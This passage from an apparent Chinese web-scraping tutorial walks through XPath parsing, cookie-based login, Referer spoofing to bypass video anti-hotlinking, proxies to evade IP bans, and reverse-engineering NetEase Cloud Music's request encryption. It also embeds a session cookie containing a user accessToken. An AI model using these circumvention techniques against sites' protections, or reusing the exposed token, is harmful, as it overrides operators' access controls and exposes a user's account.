注意xpath的顺序是从1开始的,[]表示索引# result = tree.xpath(&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;) # [@xxx=xxx]属性的筛选ol_li_list = tree.xpath(&quot;/html/body/ol/li&quot;)for li in ol_li_list:    # 从每一个li提取文字信息    result = li.xpath(&quot;./a/text()&quot;)  # 在li中继续寻找，相对查找    print(result)    result2 = li.xpath(&quot;./a/@href&quot;)  # 在li中找到a标签里href里的值    print(result2)\n\n\n​    下面这种方式也可拿到，返回的事一个列表\nfrom lxml import etreetree = etree.parse(&quot;a.html&quot;)# result = tree.xpath(&#x27;/html&#x27;)# result = tree.xpath(&#x27;/html/body/ul/li[1]/a/text()&#x27;)  # 注意xpath的顺序是从1开始的,[]表示索引# result = tree.xpath(&quot;/html/body/ol/li/a[@href=&#x27;dapao&#x27;]/text()&quot;) # [@xxx=xxx]属性的筛选ol_li_list = tree.xpath(&quot;/html/body/ol/li&quot;)for li in ol_li_list:    # 从每一个li提取文字信息    result = li.xpath(&quot;./a/text()&quot;)  # 在li中继续寻找，相对查找    print(result)    result2 = li.xpath(&quot;./a/@href&quot;)  # 在li中找到a标签里href里的值    print(result2)print(tree.xpath(&quot;/html/body/ul/li/a/@href&quot;))\n\n\n​    浏览器是可以直接获取xpath的\n\nprint(tree.xpath(&#x27;/html/body/div[1]/text()&#x27;))\n\n\nXpath实战-猪八戒信息​    url：https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1\n\n​    查看页面源代码发现在源代码里：\n    复制的xpath是这样的：/html/body/div[2]/div/div/div[2]/div/div[3]/div[4]/div[1]/div[3]，我们把最后一个删掉：/html/body/div[2]/div/div/div[2]/div/div[3]/div[4]/div[1]/div，即可获得所有的框。\n​    这里我们碰到了一些小问题，我们从浏览器直接获得的xpath没办法获取到信息了，询问大佬得知，某些网站在静态获取的时候xpath和动态的时候不一样，可能通过js改变了某些结构，从而让我们获取不到信息。我们可以通过某些关键元素的特征然后一步一步获取信息。\n​    就比如我们现在直接获取price的数值，写一个小程序看看能不能获取：\nimport requestsfrom lxml import etreeurl = &quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;resp = requests.get(url)# 解析html = etree.HTML(resp.text)# 每一个divdivs = html.xpath(&#x27;/html/body/div[2]/div/div/div[2]/div/div[3]/div[4]/div[1]/div&#x27;)for div in divs:    price = div.xpath(&quot;./div/div[3]/div[1]/span/text()&quot;)    print(price)\n\n​    寄，但是换一种写法就可以了,所以不要局限于一种方式。\n# 拿到页面源代码# 提取和解析数据import requestsfrom lxml import etreeurl = &quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;resp = requests.get(url)# 解析html = etree.HTML(resp.text)# 每一个divdivs = html.xpath(&quot;/html/body//div[@class=&#x27;service-card-wrap&#x27;]&quot;)for div in divs:    price = div.xpath(&quot;.//div[@class=&#x27;price&#x27;]/span/text()&quot;)    print(price)\n\n\n​    做一下数据处理：\n# 拿到页面源代码# 提取和解析数据import requestsfrom lxml import etreeurl = &quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;resp = requests.get(url)# 解析html = etree.HTML(resp.text)# 每一个divdivs = html.xpath(&quot;/html/body//div[@class=&#x27;service-card-wrap&#x27;]&quot;)for div in divs:    price = div.xpath(&quot;.//div[@class=&#x27;price&#x27;]/span/text()&quot;)[0].strip(&quot;￥&quot;).strip(&quot;狂欢价：&quot;).strip(&quot;¥&quot;)    title = &quot;saas&quot;.join(div.xpath(&quot;.//a[@target=&#x27;_blank&#x27;]/text()&quot;))    com_name = div.xpath(&quot;.//div[@class=&#x27;shop-info text-overflow-line&#x27;]/text()&quot;)[0]    high = div.xpath(&quot;.//div[@class=&#x27;shop-star&#x27;]/span[@class=&#x27;el-tooltip item&#x27;]/text()&quot;)[0]    print(high)\n\n​    ok完成\n# 拿到页面源代码# 提取和解析数据import csvimport requestsfrom lxml import etreeurl = &quot;https://beijing.zbj.com/search/f/?type=new&amp;kw=saas&amp;r=1&quot;resp = requests.get(url)# 解析html = etree.HTML(resp.text)# 每一个divdivs = html.xpath(&quot;/html/body//div[@class=&#x27;service-card-wrap&#x27;]&quot;)for div in divs:    price = div.xpath(&quot;.//div[@class=&#x27;price&#x27;]/span/text()&quot;)[0].strip(&quot;￥&quot;).strip(&quot;狂欢价：&quot;).strip(&quot;¥&quot;)    title = &quot;saas&quot;.join(div.xpath(&quot;.//a[@target=&#x27;_blank&#x27;]/text()&quot;))    com_name = div.xpath(&quot;.//div[@class=&#x27;shop-info text-overflow-line&#x27;]/text()&quot;)[0]    high = div.xpath(&quot;.//div[@class=&#x27;shop-star&#x27;]/span[@class=&#x27;el-tooltip item&#x27;]/text()&quot;)[0]    print([&#x27;公司名称：&#x27; + com_name] + [&#x27; 公司价格：&#x27; + price] + [&#x27; 广告名称：&#x27; + title] + [&#x27; 公司评分：&#x27; + high])resp.close()print(&quot;over&quot;)\n\n\n\n三requests进阶概述​    我们在之前的爬⾍中其实已经使⽤过headers了. header为HTTP协 议中的请求头. ⼀般存放⼀些和请求内容⽆关的数据. 有时也会存放 ⼀些安全验证信息.⽐如常⻅的User-Agent, token, cookie等. \n​    通过requests发送的请求, 我们可以把请求头信息放在headers中. 也 可以单独进⾏存放, 最终由requests⾃动帮我们拼接成完整的http请求头. \n​    本章内容: \n1. 模拟浏览器登录-&gt;处理cookie \n1. 防盗链处理-&gt; 抓取梨视频数据 \n1. 代理 -&gt; 防⽌被封IP \n\n​    综合训练: 抓取⽹易云⾳乐评论信息\n处理cookie登陆小说网# 登陆 -&gt; 得到cookie# 带着cookie去请求书架url -&gt; 书架上的内容# 必须得把上面的两个操作连起来# 用session进行请求 -&gt; session是一连串的请求，在这个过程中cookie不会丢失import requests# 会话session = requests.session()data = &#123;    &quot;loginName&quot;: &quot;13000000000&quot;,    &quot;password&quot;: &quot;123456&quot;&#125;# 1、登陆url = &quot;https://passport.17k.com/ck/user/login&quot;session.post(url, data=data)# print(resp.text)# print(resp.cookies)# 2、拿书架数据resp = session.get(&quot;https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919&quot;)print(resp.json())\n\n​    另一种写法：\n# 登陆 -&gt; 得到cookie# 带着cookie去请求书架url -&gt; 书架上的内容# 必须得把上面的两个操作连起来# 用session进行请求 -&gt; session是一连串的请求，在这个过程中cookie不会丢失import requests# 会话session = requests.session()data = &#123;    &quot;loginName&quot;: &quot;13000000000&quot;,    &quot;password&quot;: &quot;123456&quot;&#125;# 1、登陆url = &quot;https://passport.17k.com/ck/user/login&quot;session.post(url, data=data)# print(resp.text)# print(resp.cookies)# 2、拿书架数据# resp = session.get(&quot;https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919&quot;)# print(resp.json())resp = requests.get(&quot;https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919&quot;, headers=&#123;    &quot;Cookie&quot;: &quot;uuid=ECF94FC9-441F-C404-260F-38B5BA521427; c_channel=0; c_csc=web; GUID=9ee2ce7f-dbc3-40e9-93c2-05c4bdf51309; Hm_lvt_9793f42b498361373512340937deb2a0=1662986278; sajssdk_2015_cross_new_user=1; accessToken=avatarUrl%3Dhttps%253A%252F%252Fcdn.static.17k.com%252Fuser%252Favatar%252F13%252F93%252F12%252F98061293.jpg-88x88%253Fv%253D1662984766000%26id%3D98061293%26nickname%3D%25E4%25B9%25A6%25E5%258F%258B002Wc1197%26e%3D1678538408%26s%3Dca1b65e41bd3904f&quot;&#125;)print(resp.json())\n\n\n防盗链抓取梨视频​    我们抓一下梨视频的视频\n​    首先我们可以看到，我们的当前页面源码和显示源码是不一样的，因为在页面源码里没有&lt;video&gt;这个标签，应该是碰到了和前面一样的js修改的情况。\n\n​    重新加载页面然后看一下js\n\n​    发现了视频链接，然后直接访问404，寄\n\n​    对比一下这几个链接，发现是替换了几个部分。替换的部分从哪来呢\n\n\n​    还在文章的url也有\n    \n​    然后就可以开始写代码了\n​    1、拿到contId\n​    2、拿到videoStatus返回的json. -&gt; srcURL\n​    3、srcURL里面的内容进行修整\n​    4、下载视频\n# 1、拿到contId# 2、拿到videoStatus返回的json. -&gt; srcURL# 3、srcURL里面的内容进行修整# 4、下载视频import requestsurl = &quot;https://www.pearvideo.com/video_1168452&quot;contId = url.split(&quot;_&quot;)[1]videoStatusUrl = f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=&#123;contId&#125;&amp;mrd=0.38022964971760365&quot;resp = requests.get(videoStatusUrl)print(resp.text)\n\n\n​    问题出在哪呢？加个UA和Referer吧\n# 1、拿到contId# 2、拿到videoStatus返回的json. -&gt; srcURL# 3、srcURL里面的内容进行修整# 4、下载视频import requestsurl = &quot;https://www.pearvideo.com/video_1168452&quot;contId = url.split(&quot;_&quot;)[1]videoStatusUrl = f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=&#123;contId&#125;&amp;mrd=0.38022964971760365&quot;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;,    &quot;Referer&quot;: &quot;https://www.pearvideo.com/video_1168452&quot;&#125;resp = requests.get(videoStatusUrl, headers=headers)print(resp.text)\n\n\n​    处理一下格式吧\n# 1、拿到contId# 2、拿到videoStatus返回的json. -&gt; srcURL# 3、srcURL里面的内容进行修整# 4、下载视频import requestsurl = &quot;https://www.pearvideo.com/video_1168452&quot;contId = url.split(&quot;_&quot;)[1]videoStatusUrl = f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=&#123;contId&#125;&amp;mrd=0.38022964971760365&quot;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;,    &quot;Referer&quot;: url&#125;resp = requests.get(videoStatusUrl, headers=headers)dic = resp.json()srcUrl = dic[&#x27;videoInfo&#x27;][&#x27;videos&#x27;][&#x27;srcUrl&#x27;]systemTime = dic[&#x27;systemTime&#x27;]srcUrl = srcUrl.replace(systemTime, f&quot;cont-&#123;contId&#125;&quot;)print(srcUrl)\n\n\n# 1、拿到contId# 2、拿到videoStatus返回的json. -&gt; srcURL# 3、srcURL里面的内容进行修整# 4、下载视频import requestsurl = &quot;https://www.pearvideo.com/video_1168452&quot;contId = url.split(&quot;_&quot;)[1]videoStatusUrl = f&quot;https://www.pearvideo.com/videoStatus.jsp?contId=&#123;contId&#125;&amp;mrd=0.38022964971760365&quot;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;,    &quot;Referer&quot;: url&#125;resp = requests.get(videoStatusUrl, headers=headers)dic = resp.json()srcUrl = dic[&#x27;videoInfo&#x27;][&#x27;videos&#x27;][&#x27;srcUrl&#x27;]systemTime = dic[&#x27;systemTime&#x27;]srcUrl = srcUrl.replace(systemTime, f&quot;cont-&#123;contId&#125;&quot;)# 下载视频with open(&quot;a.mp4&quot;,mode=&quot;wb&quot;) as f:    f.write(requests.get(srcUrl).content)f.close()resp.close()\n\n\n代理​    当我们反复抓取⼀个⽹站时, 由于请求过于频繁, 服务器很可能会将 你的IP进⾏封锁来反爬. 应对⽅案就是通过⽹络代理的形式进⾏伪装。\n\nimport requestsheaders = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_4) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.141 Safari/537.36&quot;,&#125;proxies = &#123;    &quot;https&quot;:  &quot;http://23.26.236.11:3128&quot;&#125;resp = requests.get(&quot;https://www.baidu.com&quot;, proxies=proxies)resp.encoding = &#x27;utf-8&#x27;print(resp.text)\n\n网易云音乐评论信息\n​    想抓王心凌的评论🥵，怎么办呢。先看看网页源代码，不出所料没在源码里\n\n​    再看看框架源代码，也没有。框架源代码是什么呢，有的网页里。他会在一个html里嵌套另一个html，所以就有两套源代码\n\n​    抓个包看看，找到了评论🥵\n\n​    \n​    加密了，寄。放弃\n\n​    这个地方是请求调用堆栈的过程，从下往上依次调用，也就是加载js脚本的过程。我们找到第一个，下个断点。\n\n​    发现url处不是我们想要的url，我们放过他，一直往后找，放了八九个包，找到啦。\n\n​    发现在e2x参数时已经被加密啦，我们现在往回找\n\n​    查看调用堆栈，这里的东西和前面启动器里的是一样的，一个一个向上找，点开查看参数就行\n\n​    由上图，程序一定在t2x.be3x被加密，所以我们回看这个js\n\n​    先把断点打在此处，然后重新刷新，我们可以看到此时还没有被加密\n\n​    找到加密方法，我们可以一行一行下断点走下来，这里我不下了，直接下在加密处\n\n​    然后F10\n\n​    这一段的逻辑如下所示\n\n​    可以看到i2x为原始数据，先写成这样吧\n# 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)# 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey# 3.请求到网易，拿到评论信息url = &quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;# 请求方式是post,拿真实参数data = &#123;    &quot;csrf_token&quot;: &quot;&quot;,    &quot;cursor&quot;: &quot;-1&quot;,    &quot;offset&quot;: &quot;0&quot;,    &quot;orderType&quot;: &quot;1&quot;,    &quot;pageNo&quot;: &quot;1&quot;,    &quot;pageSize&quot;: &quot;20&quot;,    &quot;rid&quot;: &quot;R_SO_4_1474411443&quot;,    &quot;threadId&quot;: &quot;R_SO_4_1474411443&quot;&#125;# 处理加密过程\n\n​    下面处理加密过程，直接搜加密函数，就俩，那实际执行的就是d\n\n\nfunction a(a) &#123;        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;        for (d = 0; a &gt; d; d += 1)            e = Math.random() * b.length,            e = Math.floor(e),            c += b.charAt(e);        return c    &#125;    function b(a, b) &#123;        var c = CryptoJS.enc.Utf8.parse(b)          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)          , e = CryptoJS.enc.Utf8.parse(a)          , f = CryptoJS.AES.encrypt(e, c, &#123;            iv: d,            mode: CryptoJS.mode.CBC        &#125;);        return f.toString()    &#125;    function c(a, b, c) &#123;        var d, e;        return setMaxDigits(131),        d = new RSAKeyPair(b,&quot;&quot;,c),        e = encryptedString(d, a)    &#125;    function d(d, e, f, g) &#123;        var h = &#123;&#125;          , i = a(16);        return h.encText = b(d, g),        h.encText = b(h.encText, i),        h.encSecKey = c(i, e, f),        h    &#125;    function e(a, b, d, e) &#123;        var f = &#123;&#125;;        return f.encText = c(a + e, b, d),        f    &#125;\n\n​    入口是d，我们现在去看一下上面调用过程\nvar bKB4F = window.asrsea(JSON.stringify(i2x), buV2x([&quot;流泪&quot;, &quot;强&quot;]), buV2x(Rg7Z.md), buV2x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]));\n\n​    d参数就是我们的原数据，上面已经给出\n​    e参数是（buV2x([“流泪”, “强”])）这个函数运行的结果，我们别管到底是什么了，直接跑一下，’010001’\n\n​    f和e类似，跑一下\n&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;\n\n\n​    g一样\n&#x27;0CoJUm6Qyw8W8jud&#x27;\n\n​    分析一下js,可以发现我们就得把i定死，具体看下面代码注释里的分析\n# 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)# 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey# 3.请求到网易，拿到评论信息url = &quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;# 请求方式是post,拿真实参数data = &#123;    &quot;csrf_token&quot;: &quot;&quot;,    &quot;cursor&quot;: &quot;-1&quot;,    &quot;offset&quot;: &quot;0&quot;,    &quot;orderType&quot;: &quot;1&quot;,    &quot;pageNo&quot;: &quot;1&quot;,    &quot;pageSize&quot;: &quot;20&quot;,    &quot;rid&quot;: &quot;R_SO_4_1474411443&quot;,    &quot;threadId&quot;: &quot;R_SO_4_1474411443&quot;&#125;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot; \\    &quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot; \\    &quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot; \\    &quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;g = &quot;0CoJUm6Qyw8W8jud&quot;e = &quot;010001&quot;# 处理加密过程&quot;&quot;&quot;function a(a = 16) &#123;        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;        for (d = 0; a &gt; d; d += 1) # 循环16次            e = Math.random() * b.length, # 随机数，假如是 1.2345            e = Math.floor(e), # 取整 ，假设下会变为 1            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b        return c #产生随机的16位字符串    &#125;    function b(a, b) &#123;        var c = CryptoJS.enc.Utf8.parse(b)          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)          , e = CryptoJS.enc.Utf8.parse(a)          , f = CryptoJS.AES.encrypt(e, c, &#123;            iv: d,            mode: CryptoJS.mode.CBC        &#125;);        return f.toString()    &#125;    function c(a, b, c) &#123;        var d, e;        return setMaxDigits(131),        d = new RSAKeyPair(b,&quot;&quot;,c),        e = encryptedString(d, a)    &#125;d:数据e:010001f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;g:&#x27;0CoJUm6Qyw8W8jud&#x27;    function d(d, e, f, g) &#123;        var h = &#123;&#125; #h现在是空对象          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值        h.encText = b(d, g),        h.encText = b(h.encText, i),         h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了        return h    &#125;    function e(a, b, d, e) &#123;        var f = &#123;&#125;;        return f.encText = c(a + e, b, d),        f    &#125;&quot;&quot;&quot;\n\n​    我们现在在d函数上设置一个断点，asrsea的断点也在。可以发现我们的分析没有错\n\n​    把i定为：jVQn8x1vCuwKtrdO，我们在asrsea函数下面一行再设置一个断点，这样就可以观察出来加密的数值了\n\n​    得到：\nencSecKey：&quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab045722b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc322a74d1b88ff43db4091&quot;\n\n​    把js全部理清之后得到这样\n# 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)# 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey# 3.请求到网易，拿到评论信息url = &quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;# 请求方式是post,拿真实参数data = &#123;    &quot;csrf_token&quot;: &quot;&quot;,    &quot;cursor&quot;: &quot;-1&quot;,    &quot;offset&quot;: &quot;0&quot;,    &quot;orderType&quot;: &quot;1&quot;,    &quot;pageNo&quot;: &quot;1&quot;,    &quot;pageSize&quot;: &quot;20&quot;,    &quot;rid&quot;: &quot;R_SO_4_1474411443&quot;,    &quot;threadId&quot;: &quot;R_SO_4_1474411443&quot;&#125;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot; \\    &quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot; \\    &quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot; \\    &quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;g = &quot;0CoJUm6Qyw8W8jud&quot;e = &quot;010001&quot;i = &quot;jVQn8x1vCuwKtrdO&quot;def get_encSeckey():    return &quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot; \\           &quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot; \\           &quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot; \\           &quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot; \\           &quot;22a74d1b88ff43db4091&quot;# 处理加密过程&quot;&quot;&quot;function a(a = 16) &#123;        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;        for (d = 0; a &gt; d; d += 1) # 循环16次            e = Math.random() * b.length, # 随机数，假如是 1.2345            e = Math.floor(e), # 取整 ，假设下会变为 1            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b        return c #产生随机的16位字符串    &#125;    function b(a, b) &#123; # a是要加密的内容        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)          , e = CryptoJS.enc.Utf8.parse(a) # e是数据          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥            iv: d, # 偏移量            mode: CryptoJS.mode.CBC #CBC模式加密        &#125;);        return f.toString()    &#125;    function c(a, b, c) &#123;   #c不产生随机数        var d, e;        return setMaxDigits(131),        d = new RSAKeyPair(b,&quot;&quot;,c),        e = encryptedString(d, a)    &#125;d:数据e:010001f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;g:&#x27;0CoJUm6Qyw8W8jud&#x27;    function d(d, e, f, g) &#123;        var h = &#123;&#125; #h现在是空对象          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值        return h.encText = b(d, g), # g就是密钥        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了        h    &#125;    function e(a, b, d, e) &#123;        var f = &#123;&#125;;        return f.encText = c(a + e, b, d),        f    &#125;&quot;&quot;&quot;\n\n​    下面写代码，注意data是字典，而get_params接受字符串，我们需要用json转一下格式：\n# 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)# 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey# 3.请求到网易，拿到评论信息import requestsfrom crypto.Cipher import AESfrom base64 import b64encodeimport jsonurl = &quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;# 请求方式是post,拿真实参数data = &#123;    &quot;csrf_token&quot;: &quot;&quot;,    &quot;cursor&quot;: &quot;-1&quot;,    &quot;offset&quot;: &quot;0&quot;,    &quot;orderType&quot;: &quot;1&quot;,    &quot;pageNo&quot;: &quot;1&quot;,    &quot;pageSize&quot;: &quot;20&quot;,    &quot;rid&quot;: &quot;R_SO_4_1474411443&quot;,    &quot;threadId&quot;: &quot;R_SO_4_1474411443&quot;&#125;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot; \\    &quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot; \\    &quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot; \\    &quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;g = &quot;0CoJUm6Qyw8W8jud&quot;e = &quot;010001&quot;i = &quot;jVQn8x1vCuwKtrdO&quot;def get_encSeckey():    return &quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot; \\           &quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot; \\           &quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot; \\           &quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot; \\           &quot;22a74d1b88ff43db4091&quot;def get_params(data):  # 默认收到的是字符串    first = enc_params(data, g)    second = enc_params(first, i)    return second  # 返回的就是params# 加密过程def enc_params(data, key):    iv = &quot;0102030405060708&quot;    aes = AES.new(key=key.encode(&#x27;utf-8&#x27;), IV=iv.encode(&#x27;utf-8&#x27;), mode=AES.MODE_CBC)  # 创建加密器    bs = aes.encrypt(data)  # 加密，得到字节    return str(b64encode(bs), &quot;utf-8&quot;)  # 转化成字符串resp = requests.post(url, data=&#123;    &quot;params&quot;: get_params(json.dumps(data)),    &quot;encSecKey&quot;: get_encSeckey()&#125;)print(resp.text)# 处理加密过程&quot;&quot;&quot;function a(a = 16) &#123;        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;        for (d = 0; a &gt; d; d += 1) # 循环16次            e = Math.random() * b.length, # 随机数，假如是 1.2345            e = Math.floor(e), # 取整 ，假设下会变为 1            c += b.charAt(e); # 取字符串中的xxx位置 假设下会拿出字母b        return c #产生随机的16位字符串    &#125;    function b(a, b) &#123; # a是要加密的内容        var c = CryptoJS.enc.Utf8.parse(b) # b是密钥          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)          , e = CryptoJS.enc.Utf8.parse(a) # e是数据          , f = CryptoJS.AES.encrypt(e, c, &#123;   # c是加密的密钥            iv: d, # 偏移量            mode: CryptoJS.mode.CBC #CBC模式加密        &#125;);        return f.toString()    &#125;    function c(a, b, c) &#123;   #c不产生随机数        var d, e;        return setMaxDigits(131),        d = new RSAKeyPair(b,&quot;&quot;,c),        e = encryptedString(d, a)    &#125;d:数据e:010001f:&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;g:&#x27;0CoJUm6Qyw8W8jud&#x27;    function d(d, e, f, g) &#123;        var h = &#123;&#125; #h现在是空对象          , i = a(16); #根据a函数，可以发现i为16位的随机值，我们就要把i想办法设置为定值        return h.encText = b(d, g), # g就是密钥        h.encText = b(h.encText, i),  #返回的就是params,流程是：数据+g =&gt; b() =&gt; 第一次加密+i =&gt; b() =&gt; params , i也是密钥        h.encSecKey = c(i, e, f), #得到encSecKey,e和f是定死的，c函数也没有随机数产生，所以只取决于i。如果此时把i设置为定值，encSeckey就固定了        h    &#125;    function e(a, b, d, e) &#123;        var f = &#123;&#125;;        return f.encText = c(a + e, b, d),        f    &#125;&quot;&quot;&quot;\n\n\n​    好了我们运行一下，应该没问题了吧，寄\n\n​    看看，原来是加密的长度必须是16的倍数。\n# 1.找到未加密的参数, window.asrsea(参数,xxx,xxx,xxx)# 2.想办法把参数进行加密, params =&gt; encText，encSecKey =&gt; encSecKey# 3.请求到网易，拿到评论信息import requestsfrom Crypto.Cipher import AESfrom base64 import b64encodeimport jsonurl = &quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;# 请求方式是post,拿真实参数data = &#123;    &quot;csrf_token&quot;: &quot;&quot;,    &quot;cursor&quot;: &quot;-1&quot;,    &quot;offset&quot;: &quot;0&quot;,    &quot;orderType&quot;: &quot;1&quot;,    &quot;pageNo&quot;: &quot;1&quot;,    &quot;pageSize&quot;: &quot;20&quot;,    &quot;rid&quot;: &quot;R_SO_4_1474411443&quot;,    &quot;threadId&quot;: &quot;R_SO_4_1474411443&quot;&#125;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3&quot; \\    &quot;ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557&quot; \\    &quot;c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e8&quot; \\    &quot;2047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 &quot;g = &quot;0CoJUm6Qyw8W8jud&quot;e = &quot;010001&quot;i = &quot;jVQn8x1vCuwKtrdO&quot;def get_encSeckey():    return &quot;a7ef208899da73d457083e5186f7781531cc6bd374b789ee7023ea8251c&quot; \\           &quot;30f2974a234fa63bd1d70580f4efaffdcae6e4ef273346099d9cfab0457&quot; \\           &quot;22b9d4464e12ff2ad867b11a46adeec7a6880a004a2bd25c2c4e3357b40&quot; \\           &quot;865702ee7695b814a9ce28c978f17fc55cc8f157dd25073ea5b5a60fcc3&quot; \\           